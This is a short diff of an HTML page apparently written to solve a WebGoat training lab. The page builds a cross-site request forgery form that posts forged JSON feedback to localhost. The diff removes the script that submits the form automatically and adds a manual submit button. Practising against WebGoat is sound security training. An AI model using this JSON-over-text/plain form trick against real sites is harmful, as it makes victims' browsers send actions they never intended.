@@ -8,9 +8,9 @@
 </head>
 <body>
 <form name ="attack" action="http://localhost:8081/WebGoat/csrf/feedback/message" enctype="text/plain" method="POST">
-    <input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","message":"WebGoat is the best!!", "ignoreme":"'value='asdsadsa "}'>
+    <input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","message":"WebGoat is the best!!", "variable":"'value='"}'>
+    <input type="submit" name="submit">
 </form>
- <script>document.attack.submit()</script>
 </body>
 </html>
 
